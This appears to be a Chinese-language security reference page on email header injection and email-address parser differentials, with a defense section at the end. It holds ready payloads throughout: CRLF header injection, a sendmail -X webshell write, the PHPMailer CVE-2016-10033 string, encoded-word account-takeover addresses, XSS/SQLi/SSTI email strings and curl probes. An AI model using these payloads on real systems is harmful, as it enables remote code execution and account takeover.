---
attack_surface:
  - 编码/序列化滥用
  - 注入类
  - 认证/授权绕过
impact:
  - 身份伪造
  - 信息泄露
  - 远程代码执行
  - 权限提升
risk_level: 高
prerequisites:
  - SMTP 协议基础理解
  - HTTP/CRLF 注入基础
  - RFC 2822/5321 邮件地址格式认知
related_techniques:
  - crlf-injection
  - host-header-attacks
  - ssrf
  - xss
  - deserialization
difficulty: 中级
tools:
  - Burp Suite Turbo Intruder
  - Hackvertor
  - Collaborator
  - PwnScriptum
---

# Email Header Injection — 邮件头注入攻击全矩阵
> 关联文档：[CRLF](../../Reflected Values/CRLF/) · [SSRF](../../Reflected Values/SSRF/) · [XSS](../../Reflected Values/XSS/) · [Registration Vulnerabilities](../../Bypasses/Registration/)

---

# 0x01 原理与分类

邮件头注入（Email Header Injection）是通过向邮件相关参数中注入换行符（CRLF）或特殊字符来控制邮件发送行为的一类攻击。与 HTTP Header Injection 类似，攻击者利用系统将用户输入嵌入邮件头部的行为，通过注入 `%0d%0a`（CRLF）添加额外的 SMTP 头部或邮件正文。

核心漏洞源于两个层面：
1. **SMTP 层面**：用户输入被直接拼接进 `sendmail` 命令行参数或邮件头部，未进行 CRLF 清理
2. **解析层面**：不同邮件解析器（Sendmail / Postfix / Exim / 应用层库）对邮件地址的 RFC 实现存在差异

## 1.1 根本原理

邮件系统的工作链涉及多个解析环节，每个环节都有独立的 RFC 实现：

```
[用户输入] → [Web 应用验证] → [邮件库格式化] → [MTA sendmail] → [SMTP 投递] → [接收方 MTA]
     │              │                  │                  │                │
     │         仅验证格式         拼接头部/参数        解析命令行/头     实际路由决策
     │         不检查 CRLF        不清理 CRLF        信任上游输入     可能不同于预期
```

**关键矛盾**：Web 应用层验证"是否为有效邮箱"，但从未检查"该输入在 MTA 层面会产生什么行为"。

## 1.2 攻击面分类

| 攻击位置 | 注入点 | 典型场景 | 最高影响 |
|----------|--------|----------|----------|
| `From` / `Sender` 参数 | 邮件头部 CRLF | 联系表单、反馈页 | Cc/Bcc 注入、正文篡改 |
| PHP `mail()` 第 5 参数 | `sendmail` 命令行 | CMS 插件、自定义邮件 | 文件读写、RCE |
| 邮件地址 local-part | RFC 2047 编码 + 解析差异 | OAuth 注册、域名白名单 | 验证邮件劫持、ATO |
| 注册邮箱字段 | 逗号/分号分隔符 | 用户注册 | ATO、通配符滥用 |

## 1.3 影响维度与风险

| 影响 | 条件 | 评级 |
|------|------|------|
| 任意文件写入 → RCE | PHP mail() 第 5 参数可控 + Sendmail MTA | **严重** |
| 验证邮件劫持（ATO） | 注册接口支持 Encoded-Word / 邮箱注释 | **高** |
| 邮件内容篡改（钓鱼） | From/Sender 参数可控 | **高** |
| 邮件轰炸 / DoS | 通配符邮箱、无速率限制 | **中** |
| DNS 信息泄露 | SSRF 通过邮箱地址 | **低** |

---

# 0x02 SMTP Header 注入 — 邮件发送端

攻击者控制发送邮件的 `From` / `Sender` 参数时，可以注入 CRLF 追加任意 SMTP 头部。

## 2.1 Cc 与 Bcc 注入

```
From:sender@domain.com%0ACc:recipient@domain.co,%0ABcc:recipient1@domain.com
```

邮件将同时发送给原始收件人以及 Cc/Bcc 中指定的地址。利用场景：
- 窃取发送给管理员的敏感通知
- 将内部通讯抄送给攻击者

## 2.2 To 参数注入

```
From:sender@domain.com%0ATo:attacker@domain.com
```

邮件将发送到原始收件人 **和** 攻击者账户。实际投递行为取决于 MTA 对重复 `To` 头的处理方式。

## 2.3 Subject 注入

```
From:sender@domain.com%0ASubject:This is Fake Subject
```

注入的主题可能**追加**到原始主题后，也可能**替换**原始主题，取决于邮件服务的解析行为。可用于：
- 伪造紧急通知诱导点击
- 覆盖安全告警中的关键信息

## 2.4 邮件正文篡改

注入连续两个换行（`%0A%0A`）后，后续内容将作为邮件正文：

```
From:sender@domain.com%0A%0AMy New Fake Message.
```

这是 SMTP 协议决定的：头部与正文之间以空行分隔（RFC 2821）。一旦突破头部区域，攻击者可以完全控制邮件正文内容。

---

# 0x03 PHP mail() 函数 RCE 利用链

PHP 内置的 `mail()` 函数是邮件头注入的核心高危场景，因为它直接将用户输入传递给系统 `sendmail` 命令。

## 3.1 mail() 函数结构

```php
mail($to, $subject, $message, $additional_headers, $additional_parameters);
//   [0]   [1]       [2]          [3]                  [4]
```

**关键**：第 5 参数 `$additional_parameters` 经 `escapeshellcmd()` 处理后直接追加到 `sendmail` 命令行，而 `escapeshellcmd()` **不阻止**参数注入。

## 3.2 第 5 参数 ($additional_parameters) 攻击

`sendmail` 命令行构造：

```
/usr/sbin/sendmail -t -i -f sender@domain.com [additional_parameters]
```

攻击者控制 `additional_parameters` 时可以注入 sendmail 选项。

### 3.2.1 Sendmail MTA 利用向量

**向量 1：-X logfile 写入任意文件**

```
-O QueueDirectory=/tmp -X /var/www/html/backdoor.php
```

`-X` 选项将 SMTP 会话日志写入指定文件。攻击者发送包含 PHP 代码的邮件，`-X` 将邮件内容连同 SMTP 对话一起写入目标文件，产生 webshell。

需满足：目标目录可写入 PHP 文件，且该目录启用了 PHP 解析。

**向量 2：-C 覆盖配置文件**

```
-C /tmp/attacker_config.cf
```

Sendmail 使用不同配置文件运行。攻击者可以先通过其他途径（如文件上传）放置恶意配置文件，再通过 `-C` 加载。

**向量 3：-be 模式执行**

```
sender@domain.com -be
```

`-be` 进入"扩展模式"，此时邮件正文中的 `${{run{...}}}` 会被执行。

### 3.2.2 Postfix MTA 利用向量

Postfix 的 sendmail 兼容接口支持的选项较少，但也存在注入可能。核心关注 `-o` 覆盖配置项和 `-O` 选项。

### 3.2.3 Exim MTA 利用向量

Exim 的 sendmail 接口支持许多扩展选项，包括：
- `-oMa` / `-oMi` 设置 IP 地址
- `-be` 模式执行（类似 Sendmail）
- 日志注入和配置文件操控

### 3.2.4 邮件库级别的利用

**PHPMailer CVE-2016-10033**

PHPMailer 在 `setFrom()` 中未正确验证 `$from` 参数，`escapeshellcmd()` 允许注入额外参数。攻击者通过构造特殊 sender 地址实现 RCE：

```
nobody@localhost" -OQueueDirectory=/tmp -X/var/www/html/shell.php "@attacker.com
```

相关 CVE 链：
- CVE-2016-10033：PHPMailer < 5.2.18 `setFrom()` 参数注入
- CVE-2016-10045：PHPMailer < 5.2.20 `mailSend()` 绕过
- CVE-2016-10034：Zend Framework/ZendMail 受影响
- CVE-2016-10074：SwiftMailer 受影响

PwnScriptum RCE Exploit：综合利用以上 CVE 的 Python 工具，可自动化从参数注入到 webshell 落地的完整利用链。

## 3.3 第 4 参数 ($additional_headers) 注入

除命令行注入外，`$additional_headers` 如果包含未净化的用户输入，也可以注入额外的 SMTP 头部：

```
From: sender@example.com\r\nCc: attacker@evil.com
```

常见注入位置还有 `Reply-To`、`Return-Path`、`Sender` 等。

---

# 0x04 邮件地址解析欺骗 — 接收端绕过

邮件地址格式远比 `user@domain.com` 复杂。RFC 2822（Internet Message Format）和 RFC 5321（SMTP）规定的合法字符包括引号、括号注释、转义字符等，这为解析差异攻击提供了丰富空间。

## 4.1 邮件地址忽略部分

许多邮件服务器在路由时会忽略地址中的标记字符和注释：

| 符号 | 示例 | 实际路由到 |
|------|------|-----------|
| `+` | `john.doe+intigriti@example.com` | `john.doe@example.com` |
| `-` | `john.doe-tag@example.com` | 取决于服务器实现 |
| `{}` | `john.doe{tag}@example.com` | 取决于服务器实现 |
| `()` | `john.doe(intigriti)@example.com` | `john.doe@example.com` |

括号注释可以嵌套和包含空格。利用场景：
- 注册 `victim(anything)@example.com`，系统视为新账户，但验证邮件发送到 `victim@example.com`
- 绕过 "已有账户" 的唯一性检查

## 4.2 引号与特殊字符绕过

RFC 2822 允许在 local-part（`@` 之前的部分）中使用引号包裹特殊字符：

```
"\""@example.com         → 邮箱名为 " (双引号本身)
"@"@example.com          → 邮箱名为 @
" "@example.com          → 邮箱名为空格
"😃"@gmail.com           → 邮箱名为 emoji
```

允许出现在引号内的特殊字符：`( ) , ; : < > @ [ \ ]`

**白名单绕过实战**：目标仅允许 `@whitelisted.com` 域名的邮箱注册。以下 payload 可绕过：

```
inti(@inti@inti.io)@whitelisted.com     → 实际投递到 inti@inti.io
inti@inti.io(@whitelisted.com)          → 括号注释掉白名单域名
inti+ (@whitelisted.com;)@inti.io       → 分号截断，投递到 inti@inti.io
```

颜色标注分析：
- **绿色** — 最终投递地址
- **红色** — 被解析器忽略的部分

## 4.3 IP 地址格式

邮件地址可使用 IP 方括号语法：

```
john.doe@[127.0.0.1]
john.doe@[IPv6:2001:db8::1]
```

利用场景：绕过域名白名单、SSRF 通过内部 IP 探测、Burp Collaborator 集成测试。

## 4.4 RFC 2047 Encoded-Word 攻击

RFC 2047 定义了邮件头部中非 ASCII 字符的编码方式。攻击者可利用编码语法构造"分裂邮箱"——在不同解析阶段呈现不同的地址。

### 4.4.1 编码格式详解

```
=?utf-8?q?=41=42=43?=hi@example.com
```

语法拆解：
- `=?` — 编码起始标记
- `utf-8` — 字符集
- `?q?` — Q-encoding（`?b?` 为 Base64）
- `=41=42=43` — 十六进制编码数据
- `?=` — 编码结束标记

编码后：`ABChi@example.com`

可用编码组合：

```
# Q-encoding + UTF-8
=?utf-8?q?=61=62=63?=hi@example.com

# Base64 + UTF-8
=?utf-8?b?QUJD?=hi@example.com

# Q-encoding + ISO-8859-1
=?iso-8859-1?q?=61=62=63?=hi@example.com

# Q-encoding + UTF-7 (canonicalization bypass)
=?utf-7?q?<utf-7 encoded string>?=hi@example.com

# Q-encoding + UTF-7 with initial character stripped
=?utf-7?q?&=41<rest without initial A>?=hi@example.com
```

### 4.4.2 PHP 256 溢出与编码注入

PHP 的 `chr()` 函数对超出 255 的值执行 `%256` 运算，因此 `chr(0x100 + 0x40)` = `chr(0x40)` = `@`。在不同解析之间的 Unicode overflow 可产生分裂：

```
String.fromCodePoint(0x10000 + 0x40)  → 𐁀 → 在某些系统中被规范化为 @
```

**核心攻击目标**：使邮件在应用层验证时显示为 `x@example.com`，但在 MTA 投递时解析为 `RCPT TO:<"collab@psres.net>collab"@example.com>`，最终验证邮件发送到攻击者邮箱。

### 4.4.3 实际案例

**Github**：
```
=?x?q?collab=40psres.net=3e=00?=foo@example.com
```
- `=40` → `@`
- `=3e` → `>`
- `=00` → `NULL`
- 验证邮件发送到 `collab@psres.net`

**Zendesk**：
```
"=?x?q?collab=22=40psres.net=3e=00==3c22x?="@example.com
```
- 引入引号 `=22` 来闭合 Zendesk 内部语法
- `=3c` → `<`，与 `=3e`（`>`）配合完成语法闭合

**Gitlab**：
```
=?x?q?collab=40psres.net_?=foo@example.com
```
- 使用下划线 `_` 作为空格分隔符（代替 %20）
- 验证邮件发送到 `collab@psres.net`

### 4.4.4 Punycode 攻击

Punycode 用于在域名系统中表示 Unicode 字符。攻击者可利用 malformed Punycode 注入标签或脚本：

```
x@xn--svg/-9x6  →  x@<svg/
```

**Joomla 案例分析**：通过 Punycode 在邮件地址中注入 `<style` 标签，配合 CSS 数据外泄窃取 CSRF Token：

1. 注册邮箱包含 Punycode 注入的 `<style` 标签
2. CSS 选择器匹配 CSRF Token 页面中的特定值
3. 通过 CSS `background-image: url()` 将匹配值外泄到攻击者服务器
4. 利用窃取的 Token 完成认证操作

## 4.5 UUCP 与 Source Route 历史协议滥用

Sendmail 和 Postfix 保留了对历史协议的向后兼容，这些协议可被滥用来改变邮件路由。

**UUCP（Unix-to-Unix Copy）**：使用 `!` 作为分隔符，路由方向与标准邮件地址**相反**：

```
oastify.com!collab\@example.com
```

Sendmail 8.15.2 将此路由到 `oastify.com` 而非 `example.com`。`\!` 转义了 `@`，使 `@example.com` 被解释为本地用户名。

**Source Route（源路由）**：使用 `%` 进行"百分号中转"：

```
collab%psres.net(@example.com
```

Postfix 3.6.4 将此路由到 `psres.net` 而非 `example.com`。括号注释掉了 `@example.com` 部分，`%` 被转换为 `@` 实现路由中转。

```
# 百分号中转原理：
foo%psres.net@example.com
    ↓ example.com 收到后
foo@psres.net
    ↓ 转发到 psres.net
```

---

# 0x05 邮件解析器差异利用

不同 MTA 和邮件库对 RFC 标准的实现不一致，这是攻击的核心前提。

## 5.1 域名混淆创建

邮件在 **验证域**（应用层检查）和 **投递域**（MTA 实际路由）之间的不一致，根本上源于解析器对特殊字符（`!`、`%`、`\`、`()`、注释、转义）的处理差异。

**攻击流程**：
1. 目标应用验证邮箱属于 `@allowed.com` 域
2. 攻击者提交：`evil.com!user\@allowed.com`
3. 应用层解析出 `@allowed.com` → 通过验证
4. Sendmail 解析出 UUCP 路由 → 实际投递到 `evil.com`
5. 攻击者收到验证邮件 → 完成账户接管

## 5.2 Unicode Overflow 攻击

当应用层与 MTA 层使用不同的字符处理库时，Unicode codepoint 溢出可产生分裂：

```
# 不同语言/库的 char 处理差异
Java:    (char)0x10040 → 截断为 0x0040 = '@'
Python:  chr(0x10040)  → ValueError (超出范围)
PHP:     chr(0x10040)  → chr(0x10040 % 256) = chr(0x40) = '@'
JS:      String.fromCodePoint(0x10040) → '𐁁' (完整 Unicode)
```

## 5.3 攻击工具与方法论

**Burp Suite Turbo Intruder 脚本**：用于对 Encoded-Word 和特殊字符组合进行自动化 Fuzzing。

**Hackvertor**（Burp BApp）：提供内置的邮件拆分攻击（Email Splitting）功能，可直接在 Repeater 中使用。

**SMTP Fuzzer 开发要点**：
1. 构建特殊字符全集（`!`, `%`, `\`, `(`, `)`, `,`, `;`, `@`, `[`, `]` 等）
2. 使用 Collaborator 作为接收端验证实际投递
3. 对比"应用层认为的域" vs "实际投递的域"
4. 发现不一致后尝试编码变体（Q-encoding / Base64 / UTF-7）

---

# 0x06 扩展攻击面

## 6.1 邮箱字段在其他注入类型中的利用

邮件地址中的特殊字符可被下游系统解析，产生二次注入：

| 注入类型 | Payload 示例 | 说明 |
|----------|-------------|------|
| **XSS** | `test+(<script>alert(0)</script>)@example.com` | 邮箱在 Web 页面回显时触发 |
| **XSS（引号闭合）** | `"<script>alert(0)</script>"@example.com` | 利用引号闭合 HTML 属性 |
| **Template Injection** | `"<%= 7 * 7 %>"@example.com` | 邮件地址嵌入模板渲染 |
| **Template Injection** | `test+(${7*7})@example.com` | `${}` 表达式注入 |
| **SQLi** | `" OR 1=1 -- "@example.com` | 引号闭合 SQL 查询 |
| **SQLi（DROP）** | `"mail"); DROP TABLE users;--"@example.com` | 多语句 SQL 注入 |
| **SSRF** | `john.doe@abc123.burpcollaborator.net` | DNS/HTTP 回调检测 |
| **SSRF（内部 IP）** | `john.doe@[127.0.0.1]` | 内网探测 |
| **Parameter Pollution** | `victim@email=attacker@example.com` | 参数解析混淆 |
| **Header Injection** | `"%0d%0aContent-Length:%200%0d%0a%0d%0a"@example.com` | 邮件头 CRLF |
| **SMTP 命令注入** | `"recipient@test.com>\r\nRCPT TO:<victim+"@test.com` | SMTP 命令插入 |
| **Wildcard Abuse** | `%@example.com` | 通配符匹配所有用户 |

## 6.2 第三方 SSO 攻击

**XSS via 邮箱名**：Github、Salesforce 等服务允许创建含 XSS payload 的邮箱名。如果第三方应用在 OAuth 登录后未对邮箱进行 HTML 编码回显，可触发 XSS。

**ATO via 未验证邮箱**：如果 SSO 提供商（如 Salesforce）允许创建不验证邮箱的账户，攻击者可以：
1. 在 Salesforce 创建 `victim@target.com` 账户（无验证）
2. 使用 Salesforce SSO 登录目标应用
3. 如果目标应用信任 `email_verified` 为 false 的声明 → ATO

## 6.3 Reply-To 头欺骗

```
From: company.com
Reply-To: attacker.com
```

自动回复系统（如 Out-of-Office、Ticket System）可能向 `Reply-To` 地址发送包含敏感信息的回复。

## 6.4 List-Unsubscribe 头注入

RFC 2369 定义了 `List-Unsubscribe` 邮件头，允许邮件客户端提供一键退订功能。该头部可包含 `mailto:` URI 或 `http:` URL：

```
List-Unsubscribe: <mailto:unsubscribe@example.com?subject=remove>
List-Unsubscribe: <https://example.com/unsubscribe?token=xyz>
```

攻击者如果能够控制发出的邮件头部，可以注入恶意的 `List-Unsubscribe` 头：

```
List-Unsubscribe: <mailto:ceo@target.com?subject=URGENT&body=Please%20approve>
```

当受害者（收件人）点击邮件客户端的"退订"按钮时：
1. 如果是 `mailto:` — 向指定地址发送邮件（邮件内容由攻击者预设）
2. 如果是 `https:` — 向指定 URL 发起 GET 请求（SSRF / CSRF）

此技术可用于：伪造内部钓鱼邮件、CSRF Token 窃取、内网 SSRF 探测、垃圾邮件轰炸。

## 6.5 Hard Bounce Rate DoS

AWS SES 等服务监控邮件硬弹回率（Hard Bounce Rate），通常阈值为 10%。攻击者大量使用无效邮箱注册，触发硬弹回累积，可能导致目标邮件服务被暂停。

---

# 0x07 其他邮件相关漏洞

## 7.1 会话文件中 CRLF 导致的认证绕过

某些应用在认证完成前将用户状态保存至会话文件，且不清理 CRLF 字符。如果攻击者控制的 Header/Cookie/登录参数被写入会话文件，CRLF 注入可演变为认证绕过。

## 7.2 验证码/OTP 速率限制绕过

邮件验证流程中的常见缺陷（与邮件头注入联动）：

- OTP 位数过短（4-6 位数字）且无速率限制
- OTP 跨账户/跨动作复用
- 多值走私：`code=000000&code=123456` 或 JSON 数组 `{"code":["000000","123456"]}`
- 并发请求绕过顺序锁定（使用 Turbo Intruder）

## 7.3 注册-as-重置（Upsert 攻击）

某些注册接口对已存在的邮箱执行 upsert（update or insert）。如果接口接受最小字段（仅 email + password）且不验证所有权，发送受害者邮箱即可覆盖密码：

```http
POST /api/register HTTP/1.1
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```

影响：无需重置 Token、无需 OTP、无需邮箱验证的完整账户接管。

---

# 0x08 检测与防御

## 8.1 检测方法

### 手动检测清单

- [ ] 联系表单中的 `From` / `Reply-To` 是否接受 CRLF？
- [ ] 注册接口的 email 参数是否接受逗号/分号分隔的多值？
- [ ] 邮箱格式验证是否允许括号注释、引号、IP 格式？
- [ ] Encoded-Word 语法（`=?charset?q?payload?=`）是否被邮件系统解析？
- [ ] 注册邮件是否实际发送到了声称的域名？（使用 Collaborator 验证）
- [ ] PHP 应用的 `mail()` 第 5 参数是否可控？
- [ ] 密码重置接口是否受到 Host 头投毒影响？

### Fuzzing 方法

```bash
# CRLF 注入测试
echo "test%0d%0aCc:collab@example.com@target.com" | <inject into From field>

# 分隔符注入测试
curl -X POST https://target.com/api/register \
  -d 'email=victim@target.com,attacker@evil.com'

# Encoded-Word 测试
curl -X POST https://target.com/api/register \
  -d 'email==?utf-8?q?collab=40evil.com?=@target.com'
```

## 8.2 防御策略

### 应用层

1. **禁止用户输入直接进入邮件头部**：不将用户可控的 `From` / `Reply-To` / `Sender` 直接插入邮件头
2. **CRLF 过滤**：在所有进入邮件头部的字符串中过滤 `\r`（%0d）和 `\n`（%0a）
3. **严格的邮箱格式验证**：
   - 仅允许 `[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}` 格式
   - 拒绝括号、引号、注释、IP 格式
   - 拒绝 Encoded-Word 语法
4. **PHP `mail()` 安全**：
   - 不使用用户输入作为第 4 或第 5 参数
   - 优先使用 `PHPMailer` / `SwiftMailer` 并通过 API 设置参数（不用字符串拼接）
   - 升级至修复了 CVE-2016-10033/10045 的库版本
5. **始终验证邮件所有权**：不信任 SSO 提供商的 `email_verified` 字段为 false 的声明

### MTA 层

- 使用 `-t` 模式时禁用 `-be` 扩展模式
- 限制 `-X` 日志写入路径的权限
- 检查 sendmail 二进制版本并禁用不必要的选项
- Postfix：配置 `smtpd_command_filter` 限制注入可能

### 架构层

- 邮件发送与业务逻辑分离（使用队列/Job 层）
- 对第三方邮件服务（AWS SES、SendGrid）启用硬弹回监控
- 实施验证邮件 Token 的单次有效性和过期策略

---

# 0x09 攻击链建模

## 9.1 邮件解析差异 ATO 链

```
[注册接口接受 Encoded-Word] → [提交 collab@evil.com 的编码邮箱]
    → [应用层验证通过（解析出 @allowed.com）]
    → [MTA 投递到 collab@evil.com] → [攻击者收到验证邮件]
    → [验证完成，接管目标账户]
```

## 9.2 PHP mail() RCE 链

```
[识别 PHP 应用使用 mail()] → [发现第 5 参数注入点]
    → [确认 MTA 类型（Sendmail/Postfix/Exim）] → [选择对应 payload]
    → [Sendmail: -X 写入 webshell] → [HTTP 触发 webshell]
    → [内网横向移动]
```

## 9.3 XSS 联动链

```
[注册含 XSS payload 的邮箱] → [管理后台回显邮箱（未编码）]
    → [盗取管理员 Cookie] → [管理后台完全控制]
    → [向所有用户发送恶意邮件（利用 SMTP Header Injection 扩大影响）]
```

---

## 参考资料

- [PortSwigger: Splitting the email atom — exploiting parsers to bypass access controls](https://portswigger.net/research/splitting-the-email-atom)
- [ExploitBox: Pwning PHP mail() Function For Fun And RCE](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)
- [InfoSec Institute: Email Injection](https://resources.infosecinstitute.com/email-injection/)
- [Sendmail MTA: sendmail man page](http://www.sendmail.org/~ca/email/man/sendmail.html)
- [Postfix MTA: sendmail interface](http://www.postfix.org/mailq.1.html)
- [Exim MTA: exim man page](https://linux.die.net/man/8/exim)
- [CVE-2016-10033: PHPMailer RCE PoC Video](https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html)
- [PwnScriptum: PHPMailer RCE Exploit](https://legalhackers.com/exploits/CVE-2016-10033/10045/10034/10074/PwnScriptum_RCE_exploit.py)
- [AWS SES Bounce Handling](https://docs.aws.amazon.com/ses/latest/DeveloperGuide/notification-contents.html#bounce-types)
- [IETF RFC 2821 — SMTP](https://www.ietf.org/rfc/rfc2821.txt)
- [IETF RFC 2822 — Internet Message Format](https://www.ietf.org/rfc/rfc2822.txt)
